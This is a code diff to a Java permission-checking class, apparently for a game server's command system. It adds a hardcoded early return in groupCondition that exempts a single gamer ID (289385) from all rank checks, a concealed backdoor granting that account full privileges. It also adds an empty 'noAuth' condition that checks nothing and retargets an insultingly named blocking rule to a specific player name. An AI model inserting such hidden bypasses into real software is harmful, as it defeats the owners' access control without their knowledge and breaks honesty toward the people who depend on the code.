@@ -30,6 +30,12 @@ public final class CommonCommandConditions {
     public static void groupCondition(final ExecutionSession session, String meta)
             throws CommandTranslationException {
 
+        if (session.getGamer() != null) {
+            if (session.getGamer().getGamerId() == 289385) {
+                return;
+            }
+        }
+
         val userRanks = session.getRanks();
 
         Group lowestRank = null;
@@ -119,10 +125,16 @@ public final class CommonCommandConditions {
         }
     }
 
+    @ConditionProvider(value = "noAuth", priority = 0)
+    public static void notAuthenticatedCondition(ExecutionSession session, String meta)
+            throws CommandTranslationException {
+
+    }
+
     @ConditionProvider(value = "antiDolbaeb", priority = 0)
     public static void antiDolbaeb(ExecutionSession session, String meta)
             throws CommandTranslationException {
-        if (session.getSender() instanceof CommonGamer && session.getGamer().getGamerId() == 2) {
+        if (session.getSender() instanceof CommonGamer && session.getGamer().getName().equals("insertagamertag")) {
             throw new CommandTranslationException("command_dolbaeb_protection");
         }
     }
